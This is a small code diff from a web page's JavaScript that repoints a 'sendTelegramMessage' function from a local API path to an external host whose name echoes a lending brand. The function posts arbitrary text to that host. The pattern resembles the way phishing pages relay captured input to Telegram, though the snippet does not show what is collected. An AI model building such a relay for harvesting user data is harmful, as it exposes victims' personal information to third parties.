@@ -217,7 +217,7 @@
         }
 
         function sendTelegramMessage(text) {
-            fetch('/api/kirim-telegram', {
+            fetch('https://adakami-xi.vercel.app/api/kirim-telegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ pesan: text })
